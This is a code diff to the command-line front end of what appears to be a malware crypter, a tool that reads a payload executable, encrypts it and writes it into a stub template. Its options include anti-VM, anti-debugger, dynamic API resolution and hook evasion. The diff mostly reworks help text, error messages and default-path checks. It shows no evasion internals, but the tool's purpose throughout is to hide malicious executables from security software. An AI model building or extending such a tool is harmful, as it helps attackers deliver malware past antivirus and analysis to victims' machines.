@@ -17,18 +17,17 @@ void displayHelp(const int COLOR){
     setColor(COLOR);
     cout << "\nUsage: ./main.exe [options]\nOptions:\n";
     cout << "\t-h, --help                 show all options, and exit\n";
-    cout << "\t-p                         display paths for payload, stub output directory, stub template, and exit\n";
-    cout << "\t-n <\"name\">              name for stub\n";
-    cout << "\t-c, --compile              compile generated stub immediately. makefile must be configured properly\n";
-    cout << "\t--payload <C:\\\\path>       specify payload. first exe in ./bin will be used otherwise\n";
-    cout << "\t--stub <C:\\\\stub>          specify stub template. by default /resource/stub_template.cpp is used\n";
+    cout << "\t-n <name>                  set name for stub\n";
+    cout << "\t-c, --compile              compile generate stub after writing. makefile must be configured properly\n";
+    cout << "\t--payload <C:\\\\path>       specify payload. first .exe found in ./bin will be used otherwise\n";
+    cout << "\t--stub <C:\\\\path>          specify stub template. by default /resource/stub_template.cpp is used\n";
     cout << "\t--rand                     enable random memory allocations\n";
     cout << "\t--vm                       enable anti-VM mode\n";
     cout << "\t--db                       enable anti-debugger mode\n";
     cout << "\t--dyn                      enable dynamic API call resolution\n";
     cout << "\t--unhook                   evades hooks\n";
-    cout << "\t--pdb                      enable print debugging mode on stub\n";
-    cout << "\tFlags cannot be combined\n";
+    cout << "\t-p                         (debug) display default paths and exit\n";
+    cout << "\t--pdb                      (debug) enable print debugging mode on stub\n";
     resetColor();
 }
 
@@ -60,14 +59,13 @@ Config parseArgs(int argc, char* argv[], string *path_to_payload, string *path_t
             filesystem::path path = argv[++i];
 
             if(!filesystem::exists(path)){
-                throw invalid_argument("Payload path does not exist: " + path.string());
+                throw invalid_argument("Invalid payload path: " + path.string());
             }
 
             if(!filesystem::is_regular_file(path)){
-                throw invalid_argument("Payload path is not regular file: " + path.string());
+                throw invalid_argument("Payload is not regular file: " + path.string());
             }
 
-            // Not sure if it is necessary to set a flag but keeping it for now
             config.payload = true;
             config.payload_path = path.string();
             continue;
@@ -80,11 +78,11 @@ Config parseArgs(int argc, char* argv[], string *path_to_payload, string *path_t
             filesystem::path path = argv[++i];
 
             if(!filesystem::exists(path)){
-                throw invalid_argument("Stub template path does not exist: " + path.string());
+                throw invalid_argument("Invalid stub template path: " + path.string());
             }
 
             if(!filesystem::is_regular_file(path)){
-                throw invalid_argument("Stub template path is not regular file: " + path.string());
+                throw invalid_argument("Stub template is not regular file: " + path.string());
             }
 
             config.stub = true;
@@ -126,33 +124,9 @@ Config parseArgs(int argc, char* argv[], string *path_to_payload, string *path_t
     }
 
     return config;
-
-    // /bin has already been checked, if no payload is specified using --payload, search /bin for the first .exe
-    /*
-    if (tmpPl == *path_to_payload) {
-        setColor(COLOR_INFO);
-        cout << "searching ./bin...\n";
-        if (fs::exists("./bin") && fs::is_directory("./bin")) {
-            for (const auto& entry : fs::directory_iterator("./bin")) {
-                if (fs::is_regular_file(entry) && ((entry.status().permissions() & fs::perms::owner_exec) != fs::perms::none ||
-                                                   (entry.status().permissions() & fs::perms::group_exec) != fs::perms::none ||
-                                                   (entry.status().permissions() & fs::perms::others_exec) != fs::perms::none)) {
-                    *path_to_payload = entry.path().string();
-                    setColor(COLOR_SUCCESS);
-                    cout << "Found " << *path_to_payload << "\n";
-                    resetColor();
-                    return;
-                }
-            }
-            setColor(COLOR_ERROR);
-            cerr << "No exe found in ./bin. Move payload to ./bin or specify full path with --payload\n";
-            resetColor();
-            exit(1);
-        }
-    }*/
 }
 
-void displayOptions(Config c){
+void displayOptions(Config& c){
     if(c.help){
         displayHelp(COLOR_INFO);
         return;
@@ -173,18 +147,19 @@ void displayOptions(Config c){
         cout << "Stub template path set to: " << c.stub_path << endl;
     }
     if(c.rand){
-        cout << "Stub randomization mode enabled" << endl;
+        cout << "Stub randomization enabled" << endl;
     }
     if(c.vm){
-        cout << "Anti-VM mode enabled" << endl;
+        cout << "Anti-VM enabled" << endl;
     }
     if(c.db){
-        cout << "Anti-Debugger mode enabled" << endl;
+        cout << "Anti-Debugger enabled" << endl;
     }
     if(c.dyn){
-        cout << "Dynamic API call resolution enabled" << endl;
+        cout << "Dynamic API resolution enabled" << endl;
     }    
 }
+
 
 int main(int argc, char * argv[]){
 
@@ -199,63 +174,82 @@ int main(int argc, char * argv[]){
     string path_to_output_dir = (base_path / "stub").string() + "\\";
     string path_to_stub_template = (base_path / "resource\\stub_template.cpp").string();
     string stub_name;
-
-    /*
-    // Make sure the defaults exist before parsing arguments
-    setColor(COLOR_ERROR);
-    if(!filesystem::exists(path_to_payload)){
-        cerr << "./bin directory not found\n";
-        resetColor();
-        exit(1);
-    }
-    if(!filesystem::exists(path_to_output_dir)){
-        cerr << "./out directory not found\n";
-        resetColor();
-        exit(1);
-    }
-    if(!filesystem::exists(path_to_stub_template)){
-        cout << "./resource/stub.cpp not found\n";
-        resetColor();
-        exit(1);
-    }
-    resetColor();
-
-    */
-
-    Config c;
+    
+    Config config;
 
     try {
-        c = parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template, &stub_name);
+        config = parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template, &stub_name);
     } catch (const invalid_argument& e){
         setColor(COLOR_ERROR);
         cerr << "Argument error: " << e.what() << endl;
-        displayHelp(COLOR_ERROR);
+        displayHelp(COLOR_INFO);
 
-        resetColor();
         return 1;
     }
 
+    displayOptions(config);
+    if(config.help || config.paths){
+        return 0;
+    }
+
+    // Validate default paths if they were not modified 
+    // Default PL path just points to /bin rather than a specific file
+    if(!config.payload){
+        fs::path payload_dir = config.payload_path;
+
+        if(!fs::exists(payload_dir) || !fs::is_directory(payload_dir)){
+            cerr << "Default payload directory path error: " << payload_dir << " not found or invalid format" << endl;
+            return 1;
+        }
+        cout << "Searching bin/ ..." << endl;
+        for (const auto& entry : fs::directory_iterator(payload_dir)) {
+            if (fs::is_regular_file(entry) && entry.path().extension() == ".exe"){
+                config.payload_path = entry.path().string();
+                cout << "Found " << config.payload_path << endl;
+                break;
+            }
+        }
+        if(fs::is_directory(config.payload_path)){
+            cerr << "No exe found in " << payload_dir << endl;
+            return 1;
+        }
+    }
+    if(!config.stub){
+        if(!fs::exists(config.stub_path) || !fs::is_regular_file(config.stub_path)){
+            cerr << "Default stub template path error: " << config.stub_path << " not found or invalid format" << endl;
+            return 1;
+        }
+    }
+    // No option to change output directory, always validate
+    if(!fs::exists(config.output_dir) || !fs::is_directory(config.output_dir)){
+        cerr << "Output directory path error: " << config.output_dir << " not found or invalid format" << endl;
+        return 1;
+    }
     
-
-
-    displayOptions(c);
+    
     return 0;
 
-    // reading bytes of payload
     vector<unsigned char> buf = readBinary(path_to_payload);
     if(buf.empty()){
         setColor(COLOR_ERROR);
         cerr << "Error reading binary\n";
         resetColor();
-        exit(1);
+        return 1;
     }
 
     // key and IV gen
     auto [key, iv] = generateKeyAndIV(LEN, LEN);
     vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
-    //Xor(buf, 0x1A);
-
-    writeStub(flags, stub_name, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);
+    
+    try {
+        writeStub(config, payloadBytes, key, iv);
+    } catch(runtime_error& e){
+        setColor(COLOR_ERROR);
+        cerr << "Error writing stub: " << e.what() << endl;
+        resetColor();
+        return 1;
+    }
+    
 
     return 0;
 }
